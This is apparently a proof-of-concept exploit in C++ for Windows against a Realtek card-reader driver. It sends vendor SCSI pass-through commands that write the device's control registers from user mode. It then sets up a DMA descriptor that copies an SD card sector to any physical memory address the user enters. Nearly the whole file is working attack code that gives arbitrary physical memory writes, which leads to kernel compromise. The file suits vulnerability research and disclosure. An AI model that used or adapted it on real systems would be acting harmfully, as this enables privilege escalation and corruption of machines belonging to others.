#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <winioctl.h>
#include <SetupAPI.h>
#include <initguid.h>
#include <ntddscsi.h>
#include <stdio.h>

typedef enum _CSR_REGS
{
    RTSX_HCBAR   = 0, //Host Command Buffer Register
    RTSX_HCBCTLR = 1, //Host Command Control Register
    RTSX_HDBAR   = 2, //Host Data Buffer Register
    RTSX_HDBCTLR = 3  //Host Data Control Register
} CSR_REGS;

typedef enum _INSTR_OP
{
    OP_READ  = 0,
    OP_WRITE = 1,
    OP_CHECK = 2
} INSTR_OP;

struct _VERBOSITY
{
    DWORD LogEnabled : 1;
    DWORD Verbose1   : 1;
    DWORD Verbose2   : 1;
} Verbosity;

DWORD InstrCount;
DWORD g_CmdBufPhysAddr;

DEFINE_GUID(DevInterfaceGuid, 0xb6a6b22e, 0xd723, 0x4e95, 0xa5, 0x18, 0x6c, 0xbd, 0xbf, 0xa8, 0xcb, 0x61);

DWORD _bswap32(DWORD a)
{
    a = ((a & 0x000000FF) << 24) |
        ((a & 0x0000FF00) << 8) |
        ((a & 0x00FF0000) >> 8) |
        ((a & 0xFF000000) >> 24);
    return a;
}

VOID DumpMemory(LPVOID Address, DWORD Length)
{
    BYTE* ptr = (BYTE*)Address;
    for (SIZE_T i = 0; i < Length; i += 0x10)
    {
        printf("%p  ", ptr + i);

        // Hex bytes
        for (SIZE_T j = 0; j < 0x10; j++)
            printf("%02X ", ptr[i + j]);

        printf(" |");

        // ASCII representation
        for (SIZE_T j = 0; j < 0x10; j++)
        {
            BYTE c = ptr[i + j];
            printf("%c", isprint(c) ? c : '.');
        }

        printf("|\n");
    }
}

HANDLE OpenDeivce()
{
    HANDLE hDevice = INVALID_HANDLE_VALUE;

    HDEVINFO hDevInfo = SetupDiGetClassDevsW(
        &DevInterfaceGuid,
        nullptr,
        nullptr,
        DIGCF_PRESENT | DIGCF_DEVICEINTERFACE
    );

    if (hDevInfo == INVALID_HANDLE_VALUE)
    {
        printf("SetupDiGetClassDevsW failed: %d\n", GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    SP_DEVICE_INTERFACE_DATA InterfaceData;
    ZeroMemory(&InterfaceData, sizeof(SP_DEVICE_INTERFACE_DATA));
    InterfaceData.cbSize = sizeof(SP_DEVICE_INTERFACE_DATA);
    BOOL r = SetupDiEnumDeviceInterfaces(
        hDevInfo,
        nullptr,
        &DevInterfaceGuid,
        0,
        &InterfaceData
    );
    if (r == FALSE)
    {
        printf("SetupDiEnumDeviceInterfaces failed: %d\n", GetLastError());
        SetupDiDestroyDeviceInfoList(hDevInfo);
    }

    DWORD RequiredSize = 0;
    SetupDiGetDeviceInterfaceDetailW(
        hDevInfo,
        &InterfaceData,
        0,
        0,
        &RequiredSize,
        0
    );

    DWORD err = GetLastError();
    if (err != ERROR_INSUFFICIENT_BUFFER)
    {
        printf("SetupDiGetDeviceInterfaceDetailW unexpected error: %d\n", err);
        SetupDiDestroyDeviceInfoList(hDevInfo);
        return INVALID_HANDLE_VALUE;
    }

    PSP_DEVICE_INTERFACE_DETAIL_DATA pDetailData = (PSP_DEVICE_INTERFACE_DETAIL_DATA)HeapAlloc(GetProcessHeap(), 0, RequiredSize);
    if (pDetailData)
    {
        pDetailData->cbSize = sizeof(*pDetailData);
        r = SetupDiGetDeviceInterfaceDetailW(
            hDevInfo,
            &InterfaceData,
            pDetailData,
            RequiredSize,
            &RequiredSize,
            0);
        if (r == FALSE)
        {
            printf("SetupDiGetDeviceInterfaceDetailW failed: %d\n", GetLastError());
        }
        else
        {
            hDevice = CreateFileW(
                pDetailData->DevicePath,
                0x001201bf,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                nullptr,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                nullptr
            );
            if (hDevice == INVALID_HANDLE_VALUE)
            {
                printf("CreateFileW failed: %d\n", GetLastError());
            }
        }
    }

    if (pDetailData != nullptr)
    {
        HeapFree(GetProcessHeap(), 0, pDetailData);
    }
    SetupDiDestroyDeviceInfoList(hDevInfo);

    return hDevice;
}

VOID SaveLogToFile(PVOID Buffer, ULONG Size)
{
    auto RealSize = strlen((char*)Buffer);
    FILE* f = fopen("rts.log", "w");
    if (f == nullptr)
    {
        printf("SaveLogToFile: fopen failed\n");
    }
    else
    {
        auto r = fwrite(Buffer, 1, RealSize, f);
        if (r == 0)
        {
            printf("SaveLogToFile: fwrite failed\n");
        }
        fclose(f);
    }
}

VOID SaveLog(HANDLE hDev)
{
#define IOCTL_GET_LOG CTL_CODE(FILE_DEVICE_MASS_STORAGE, 0x8CA, METHOD_BUFFERED, FILE_ANY_ACCESS)

    if (Verbosity.LogEnabled == FALSE)
    {
        return;
    }

    static CHAR log[0x1000000]; //big log
    DWORD BytesReturned = 0;
    
    BOOL r = DeviceIoControl(hDev, IOCTL_GET_LOG, nullptr, 0, log, sizeof(log), &BytesReturned, nullptr);
    if (r == FALSE)
    {
        struct LogDescriptor
        {
            ULONG Size;
            PVOID Buffer;
        } desc;
        desc.Buffer = log;
        desc.Size = sizeof(log);

        r = DeviceIoControl(hDev, IOCTL_GET_LOG, &desc, sizeof(desc), nullptr, 0, &BytesReturned, nullptr);
        if (r == FALSE)
        {
            BytesReturned = 0;
            printf("DeviceIoControl IOCTL_GET_LOG failed: %d\n", GetLastError());
        }
    }

    if (BytesReturned)
    {
        SaveLogToFile(log, BytesReturned);
    }
}

VOID RtsResetCard(HANDLE hDev)
{
    SCSI_PASS_THROUGH_DIRECT Scsi;

    RtlZeroMemory(&Scsi, sizeof(Scsi));
    Scsi.Length = sizeof(Scsi);
    Scsi.Cdb[0] = 0xD6; //cprm command reset
    Scsi.Cdb[1] = 0;
    Scsi.Cdb[2] = 'S';
    Scsi.Cdb[3] = 'D';
    Scsi.Cdb[4] = ' ';
    Scsi.Cdb[5] = 'C';
    Scsi.Cdb[6] = 'a';
    Scsi.Cdb[7] = 'r';
    Scsi.Cdb[8] = 'd';
    Scsi.Cdb[9] = 0x64;

    DWORD BytesReturned;
    BOOL r = DeviceIoControl(hDev, IOCTL_SCSI_PASS_THROUGH_DIRECT, &Scsi, sizeof(Scsi), &Scsi, sizeof(Scsi), &BytesReturned, 0);
    if (r == FALSE)
    {
        printf("DeviceIoControl RtsResetCard failed: %d\n", GetLastError());
    }
}

VOID RtsEnableCprm(HANDLE hDev)
{
    SCSI_PASS_THROUGH_DIRECT Scsi;

    RtlZeroMemory(&Scsi, sizeof(Scsi));
    Scsi.Length = sizeof(Scsi);
    Scsi.Cdb[0] = 0xD0; //cprm enable
    Scsi.Cdb[1] = 1;
    Scsi.Cdb[2] = 'S';
    Scsi.Cdb[3] = 'D';
    Scsi.Cdb[4] = ' ';
    Scsi.Cdb[5] = 'C';
    Scsi.Cdb[6] = 'a';
    Scsi.Cdb[7] = 'r';
    Scsi.Cdb[8] = 'd';
    //Scsi.Cdb[9] = 0x64;

    DWORD BytesReturned;
    BOOL r = DeviceIoControl(hDev, IOCTL_SCSI_PASS_THROUGH_DIRECT, &Scsi, sizeof(Scsi), &Scsi, sizeof(Scsi), &BytesReturned, 0);
    if (r == FALSE)
    {
        printf("DeviceIoControl RtsEnableCprm failed: %d\n", GetLastError());
    }
}

//
// Resets command buffer
//
VOID RtsResetBuffer(HANDLE hDev)
{
    SCSI_PASS_THROUGH_DIRECT Scsi;

    RtlZeroMemory(&Scsi, sizeof(Scsi));
    Scsi.Length = sizeof(Scsi);
    Scsi.Cdb[0] = 0xF0; //SCSI vendor-specific command
    Scsi.Cdb[1] = 0x10; //app_cmd
    Scsi.Cdb[2] = 0xE0; //scsi_common_suit_rw_mem_cmd_buf
    Scsi.Cdb[3] = 0x41;

    DWORD Data = 0x0;
    Scsi.DataBuffer = &Data;
    Scsi.DataTransferLength = 0x4;

    DWORD BytesReturned;
    BOOL r = DeviceIoControl(hDev, IOCTL_SCSI_PASS_THROUGH_DIRECT, &Scsi, sizeof(Scsi), &Scsi, sizeof(Scsi), &BytesReturned, 0);
    if (r == TRUE)
    {
        InstrCount = 0;
    }
    else
    {
        printf("DeviceIoControl RtsInitCmd failed: %d\n", GetLastError());
    }

    if (Verbosity.Verbose1)
    {
        printf("RtsResetBuffer buffer: %p\n", Scsi.DataBuffer);
    }

}

//
// Adds instruction to command buffer
//
VOID RtsAddInstr(HANDLE hDev, INSTR_OP op, WORD reg, BYTE mask, BYTE value)
{
    SCSI_PASS_THROUGH_DIRECT Scsi;

    RtlZeroMemory(&Scsi, sizeof(Scsi));
    Scsi.Length = sizeof(Scsi);
    Scsi.Cdb[0] = 0xF0; //SCSI vendor-specific command
    Scsi.Cdb[1] = 0x10; //app_cmd
    Scsi.Cdb[2] = 0xE0; //scsi_common_suit_rw_mem_cmd_buf
    Scsi.Cdb[3] = 0x42;
    Scsi.Cdb[4] = op;
    Scsi.Cdb[5] = reg >> 8;
    Scsi.Cdb[6] = static_cast<UCHAR>(reg);
    Scsi.Cdb[7] = mask;
    Scsi.Cdb[8] = value;

    DWORD Data = 0x0;
    Scsi.DataBuffer = &Data;
    Scsi.DataTransferLength = 0x4;

    DWORD BytesReturned;
    BOOL r = DeviceIoControl(
        hDev,
        IOCTL_SCSI_PASS_THROUGH_DIRECT,
        &Scsi,
        sizeof(Scsi),
        &Scsi,
        sizeof(Scsi),
        &BytesReturned,
        0);
    if (r == TRUE)
    {
        InstrCount++;
    }
    else
    {
        printf("DeviceIoControl RtsAddInstr failed: %d\n", GetLastError());
    }

    if (Verbosity.Verbose1)
    {
        printf("RtsAddInstr buffer: %p\n", Scsi.DataBuffer);
    }
}

//
// Instructs the card reader to execute the command buffer and waits for the completion interrupt
//
VOID RtsExecBuffer(HANDLE hDev)
{
    SCSI_PASS_THROUGH_DIRECT Scsi;

    RtlZeroMemory(&Scsi, sizeof(Scsi));
    Scsi.Length = sizeof(Scsi);
    Scsi.Cdb[0] = 0xF0; //SCSI vendor-specific command
    Scsi.Cdb[1] = 0x10; //app_cmd
    Scsi.Cdb[2] = 0xE0; //scsi_common_suit_rw_mem_cmd_buf
    Scsi.Cdb[3] = 0x43;

    DWORD Data = 0x0;
    Scsi.DataBuffer = &Data;
    Scsi.DataTransferLength = 0x4;

    DWORD BytesReturned;
    BOOL r = DeviceIoControl(hDev, IOCTL_SCSI_PASS_THROUGH_DIRECT, &Scsi, sizeof(Scsi), &Scsi, sizeof(Scsi), &BytesReturned, 0);
    if (r == FALSE)
    {
        printf("DeviceIoControl RtsExecCmdBuf failed: %d\n", GetLastError());
    }

    if (Verbosity.Verbose1)
    {
        printf("RtsExecBuffer buffer: %p\n", Scsi.DataBuffer);
    }
}

//
// Copies byte fom the command buffer to the user mode buffer
//
VOID RtsFetchBuffer(HANDLE hDev, BYTE Index, PBYTE pResp)
{
    SCSI_PASS_THROUGH_DIRECT Scsi;

    RtlZeroMemory(&Scsi, sizeof(Scsi));
    Scsi.Length = sizeof(Scsi);
    Scsi.Cdb[0] = 0xF0; //SCSI vendor-specific command
    Scsi.Cdb[1] = 0x10; //app_cmd
    Scsi.Cdb[2] = 0xE0; //scsi_common_suit_rw_mem_cmd_buf
    Scsi.Cdb[3] = 0x44; //get resp
    Scsi.Cdb[4] = Index;

    DWORD Buffer;
    Scsi.DataBuffer = &Buffer;
    Scsi.DataTransferLength = 0x1;

    DWORD BytesReturned;
    BOOL r = DeviceIoControl(hDev, IOCTL_SCSI_PASS_THROUGH_DIRECT, &Scsi, sizeof(Scsi), &Scsi, sizeof(Scsi), &BytesReturned, 0);
    if (r == TRUE)
    {
        *pResp = (BYTE)Buffer;
    }
    else
    {
        printf("DeviceIoControl RtsFetchByteCmdBuf failed: %d\n", GetLastError());
    }

    if (Verbosity.Verbose1)
    {
        printf("RtsFetchBuffer buffer: %p\n", Scsi.DataBuffer);
    }
}

//
// Writes a value to the CSR register specified by the index
//
VOID WriteToCSR(HANDLE hDev, CSR_REGS Index, DWORD Value)
{
    SCSI_PASS_THROUGH_DIRECT Sptd;

    RtlZeroMemory(&Sptd, sizeof(Sptd));
    Sptd.Length = sizeof(Sptd);
    Sptd.Cdb[0] = 0xF0; //SCSI vendor-specific command
    Sptd.Cdb[1] = 0x10; //app_cmd
    Sptd.Cdb[2] = 0xD;  //write to CSR
    Sptd.Cdb[3] = 0x0;
    Sptd.Cdb[4] = Index * 4;

    DWORD Data = Value;
    Sptd.DataBuffer = &Data;
    Sptd.DataTransferLength = 0x4;

    DWORD BytesReturned;
    BOOL r = DeviceIoControl(hDev, IOCTL_SCSI_PASS_THROUGH_DIRECT, &Sptd, sizeof(Sptd), &Sptd, sizeof(Sptd), &BytesReturned, 0);
    if (r == FALSE)
    {
        printf("DeviceIoControl WriteToCSR failed: %d\n", GetLastError());
    }

    if (Verbosity.Verbose1)
    {
        printf("WriteToCSR buffer: %p\n", Sptd.DataBuffer);
    }
}

//
// Reads a value from the CSR register specified by the index
//
VOID ReadFromCSR(HANDLE hDev, CSR_REGS Index, PDWORD pValue)
{
    SCSI_PASS_THROUGH_DIRECT Scsi;

    RtlZeroMemory(&Scsi, sizeof(Scsi));
    Scsi.Length = sizeof(Scsi);
    Scsi.Cdb[0] = 0xF0; //SCSI vendor-specific command
    Scsi.Cdb[1] = 0x10; //app_cmd
    Scsi.Cdb[2] = 0x1D; //Read from CSR
    Scsi.Cdb[3] = 0x0;
    Scsi.Cdb[4] = Index * 4;

    Scsi.DataBuffer = pValue;
    Scsi.DataTransferLength = 0x4;

    DWORD BytesReturned;
    BOOL r = DeviceIoControl(hDev, IOCTL_SCSI_PASS_THROUGH_DIRECT, &Scsi, sizeof(Scsi), &Scsi, sizeof(Scsi), &BytesReturned, 0);
    if (r == FALSE)
    {
        printf("DeviceIoControl ReadFromCSR failed: %d\n", GetLastError());
    }

    if (Verbosity.Verbose1)
    {
        printf("ReadFromCSR buffer: %p\n", Scsi.DataBuffer);
    }
}

//
// Writes a DWORD value to the command buffer
//
BOOL WriteValueBuffer(HANDLE hDev, DWORD Value)
{
    DWORD op = Value >> 0x1E;
    op &= 0x3;
    if (op == 3)
    {
        return FALSE;
    }
    DWORD reg = Value >> 0x10;
    reg &= 0x3FFF;
    DWORD mask = Value >> 0x8;
    mask &= 0xFF;
    DWORD val = Value;
    val &= 0xFF;

    if (Verbosity.Verbose2)
    {
        printf("WriteToCmdBuffer value %x split into args: %x %x %x %x\n",
            Value, op, reg, mask, val);
    }
    RtsAddInstr(
        hDev,
        static_cast<INSTR_OP>(op),
        static_cast<WORD>(reg),
        static_cast<BYTE>(mask),
        static_cast<BYTE>(val));

    return TRUE;
}

//
// The driver doesn't provide a routine that triggers command buffer execution without waiting for an interrupt,
// so here is a custom implementation that only triggers execution
//
VOID ExecBufferAsynch(HANDLE hDev)
{
    WriteToCSR(hDev, RTSX_HCBAR, g_CmdBufPhysAddr);

    auto CmdBufValue = InstrCount;
    CmdBufValue *= 4;
    CmdBufValue &= 0xFFFFFF;
    CmdBufValue |= 0xC0000000; //RTSX_START_CMD | RTSX_HW_AUTO_RSP
    CmdBufValue = _bswap32(CmdBufValue);
    WriteToCSR(hDev, RTSX_HCBCTLR, CmdBufValue);

    if (Verbosity.Verbose2)
    {
        printf("ExecBufferAsynch: commands sent, count: %d\n", CmdBufValue);
    }
}

//
// Points the data buffer to the command buffer and triggers an ADMA2 transfer. 
// The card reader will treat the contents of the command buffer as a DMA descriptor
//
VOID DoDmaTransfer(HANDLE hDev)
{
    DWORD Cmd = 0xA8000000;
    Cmd = _bswap32(Cmd);

    WriteToCSR(hDev, RTSX_HDBAR, g_CmdBufPhysAddr);
    WriteToCSR(hDev, RTSX_HDBCTLR, Cmd);

    if (Verbosity.Verbose2)
    {
        printf("RtsDoDmaTransfer: DMA transfer triggered\n");
    }
}

BOOL ReadToPhysicalMemory(HANDLE hDev, DWORD PhysAddr, DWORD Lba)
{
    RtsEnableCprm(hDev);
    RtsResetCard(hDev);

    RtsResetBuffer(hDev);

    BYTE Lba0, Lba1, Lba2, Lba3;
    Lba0 = static_cast<BYTE>(Lba);
    Lba1 = static_cast<BYTE>(Lba >> 8);
    Lba2 = static_cast<BYTE>(Lba >> 16);
    Lba3 = static_cast<BYTE>(Lba >> 24);

    // Step 1: execute SCSI command
    //
    // Registers 0xFDA9–0xFDAD (SD_CMD0–4) hold the SCSI command code and parameters.
    // 0x40 marks the start of the SCSI command, and 0x11 encodes the READ_SINGLE_BLOCK SCSI command
    //
    RtsAddInstr(hDev, OP_WRITE, 0xFDA9, 0xFFu, 0x40 | 0x11); //SD_CMD0
    RtsAddInstr(hDev, OP_WRITE, 0xFDAA, 0xFFu, Lba3); //SD_CMD1
    RtsAddInstr(hDev, OP_WRITE, 0xFDAB, 0xFFu, Lba2); //SD_CMD2
    RtsAddInstr(hDev, OP_WRITE, 0xFDAC, 0xFFu, Lba1); //SD_CMD3
    RtsAddInstr(hDev, OP_WRITE, 0xFDAD, 0xFFu, Lba0); //SD_CMD4

    // Number of blocks and bytes to read: 1 block, 0x200 bytes
    RtsAddInstr(hDev, OP_WRITE, 0xFDAF, 0xFFu, 0x00); //SD_BYTE_CNT_L
    RtsAddInstr(hDev, OP_WRITE, 0xFDB0, 0xFFu, 0x02); //SD_BYTE_CNT_H
    RtsAddInstr(hDev, OP_WRITE, 0xFDB1, 0xFFu, 0x01); //SD_BLOCK_CNT_L
    RtsAddInstr(hDev, OP_WRITE, 0xFDB2, 0xFFu, 0x00); //SD_BLOCK_CNT_H

    // DMA transfer length (DMATC0-3) and DMA config
    RtsAddInstr(hDev, OP_WRITE, 0xFE21, 0x80u, 0x80u); //IRQSTAT0 : 0x80 : DMA_DONE_INT
    RtsAddInstr(hDev, OP_WRITE, 0xFE2B, 0xFFu, 0); //DMATC3
    RtsAddInstr(hDev, OP_WRITE, 0xFE2A, 0xFFu, 0); //DMATC2
    RtsAddInstr(hDev, OP_WRITE, 0xFE29, 0xFFu, 2); //DMATC1
    RtsAddInstr(hDev, OP_WRITE, 0xFE28, 0xFFu, 0); //DMATC0
    //DMACTL : 0x33, 0x23 : DMA_EN | RTSX_DMA_DIR | RTSX_DMA_PACK_SIZE_MASK : DMA_EN | RTSX_DMA_DIR_FROM_CARD | RTSX_DMA_512
    RtsAddInstr(hDev, OP_WRITE, 0xFE2C, 0x1 | 0x2 | 0x30, 0x1 | 0x2 | 0x20);

    // Set ring buffer is the data source for the transfer
    RtsAddInstr(hDev, OP_WRITE, 0xFD5B, 1, 0); //CARD_DATA_SOURCE : 0 : RTSX_RING_BUFFER

    // A few more settings...
    RtsAddInstr(hDev, OP_WRITE, 0xFDA1, 0xFFu, 0x1); //SD_CFG2 : RTSX_SD_RSP_LEN_6 : 1

    RtsAddInstr(hDev, OP_WRITE, 0xFDB3, 0xFFu, 0x80 | 0xD); //SD_TRANSFER : SD_TRANSFER_START | RTSX_TM_AUTO_READ1
    RtsAddInstr(hDev, OP_CHECK, 0xFDB3, 0x40u, 0x40); //SD_TRANSFER : SD_TRANSFER_END

    //
    // Execute the added instructions without waiting for an interrupt
    //
    ExecBufferAsynch(hDev);

    //
    // Step 2: configure and trigger DMA transfer
    //

    RtsResetBuffer(hDev);

    //
    // Create a DMA descriptor in the command buffer with two DWORD writes:
    // 1. Flags and transfer length
    // 2. Physical address of the transfer destintation
    //
    DWORD LengthFlags = 0x02000023;
    BOOL r = WriteValueBuffer(hDev, LengthFlags);
    if (r == FALSE)
    {
        printf("The length/flags %x of the DMA desc can't be encoded\n", LengthFlags);
        return r;
    }

    r = WriteValueBuffer(hDev, PhysAddr);
    if (r == FALSE)
    {
        printf("The physical address %x of the DMA desc can't be encoded\n", PhysAddr);
        return r;
    }
    
    //
    // Trigger DMA transfer.
    // Normally transfers end with an interrupt, but as a user-mode app we can't detect it, so we just hope it worked
    //
    if (r == TRUE)
    {
        DoDmaTransfer(hDev);
    }
    return r;
}

//
// Minimal test.
// Programs the card reader to execute a READ_SINGLE_BLOCK command using the ping-pong buffer and fetches its contents
//
VOID MinimalTest(HANDLE hDev)
{
    RtsEnableCprm(hDev);
    RtsResetCard(hDev);

    RtsResetBuffer(hDev);

    RtsAddInstr(hDev, OP_WRITE, 0xFDA9, 0xFFu, 0x40 | 0x11); //SD_CMD0
    RtsAddInstr(hDev, OP_WRITE, 0xFDAA, 0xFFu, 0x0); //SD_CMD1
    RtsAddInstr(hDev, OP_WRITE, 0xFDAB, 0xFFu, 0x0); //SD_CMD2
    RtsAddInstr(hDev, OP_WRITE, 0xFDAC, 0xFFu, 0x0); //SD_CMD3
    RtsAddInstr(hDev, OP_WRITE, 0xFDAD, 0xFFu, 0x0); //SD_CMD4

    RtsAddInstr(hDev, OP_WRITE, 0xFDAF, 0xFFu, 0x80); //SD_BYTE_CNT_L
    RtsAddInstr(hDev, OP_WRITE, 0xFDB0, 0xFFu, 0x0); //SD_BYTE_CNT_H
    RtsAddInstr(hDev, OP_WRITE, 0xFDB1, 0xFFu, 0x1); //SD_BLOCK_CNT_L
    RtsAddInstr(hDev, OP_WRITE, 0xFDB2, 0xFFu, 0x0); //SD_BLOCK_CNT_H

    RtsAddInstr(hDev, OP_WRITE, 0xFDA0, 0x3u, 0x1); //SD_CFG1

    RtsAddInstr(hDev, OP_WRITE, 0xFDA1, 0xFFu, 0x1 | 0x40); //SD_CFG2 : RTSX_SD_RSP_TYPE_R1 | RTSX_SD_NO_CHECK_CRC16
    RtsAddInstr(hDev, OP_WRITE, 0xFD5B, 1, 1); //CARD_DATA_SOURCE : 1 : RTSX_PINGPONG_BUFFER

    RtsAddInstr(hDev, OP_WRITE, 0xFDB3, 0xFFu, 0x80 | 0xC); //SD_TRANSFER : RTSX_TM_CMD_RSP | SD_TRANSFER_START
    RtsAddInstr(hDev, OP_CHECK, 0xFDB3, 0x40u, 0x40); //SD_TRANSFER : SD_TRANSFER_END | RTSX_SD_STAT_IDLE

    // Execute added instructions and wait for an interrupt
    RtsExecBuffer(hDev);

    //
    // Add and execute 0x80 instructions reading from registers 0xFA00 and onward.
    // The register range represents the ping-pong buffer; reading each register
    // copies the corresponding byte to the command buffer
    //
    RtsResetBuffer(hDev);
    WORD reg = 0xFA00;
    for (DWORD i = 0; i < 0x80; i++)
    {
        RtsAddInstr(hDev, OP_READ, reg, 0, 0);
        reg++;
    }

    // Execute and wait for interrupt again
    RtsExecBuffer(hDev);
    
    // Fetch 0x80 bytes from the command buffer
    BYTE Resp[0x80];
    RtlZeroMemory(Resp, 0x80);
    for (BYTE i = 0; i < 0x80; i++)
    {
        RtsFetchBuffer(hDev, i, &Resp[i]);
    }

    DumpMemory(Resp, 0x80);
}

int main(int argc, char** argv)
{
    DWORD TargetAddress;
    DWORD SectorAddress;
    HANDLE hDev = OpenDeivce();

    if (hDev == INVALID_HANDLE_VALUE)
    {
        printf("OpenDeivce failed\n");
        return -1;
    }

    // The command buffer address (hopefully) doesn't change, so read it once and reuse it
    ReadFromCSR(hDev, RTSX_HCBAR, &g_CmdBufPhysAddr);

    for (;;)
    {
        printf("Enter physical address: ");
        int sr = scanf("%x", &TargetAddress);
        if (sr != 1)
        {
            // Use command buffer as target if user didn’t provide an address
            TargetAddress = _bswap32(g_CmdBufPhysAddr);
            printf("No physical address, setting to %x\n", TargetAddress);
        }

        printf("Enter sector address: ");
        sr = scanf("%x", &SectorAddress);
        if (sr != 1)
        {
            SectorAddress = 0;
            printf("No sector address, setting to 0\n");
        }

        printf("Reading from sector %x to physical memory address %x\n", SectorAddress, TargetAddress);
        BOOL r = ReadToPhysicalMemory(hDev, TargetAddress, SectorAddress);
        if (r == TRUE)
        {
            printf("DMA transfer started, check target memory\n");
        }
        else
        {
            printf("DMA transfer failed, saving log\n");
            SaveLog(hDev);
        }
        
        // If the command buffer was the target, copy it
        if (_bswap32(TargetAddress) == g_CmdBufPhysAddr)
        {
            BYTE Resp[0x100];

            printf("Fetching data from command buffer\n");
            RtlZeroMemory(Resp, 0x100);
            for (BYTE i = 0; i <= 0xFF; i++)
            {
                RtsFetchBuffer(hDev, i, &Resp[i]);
            }
            DumpMemory(Resp, 0x100);
        }

        getchar();
    }

    CloseHandle(hDev);

    return 0;
}
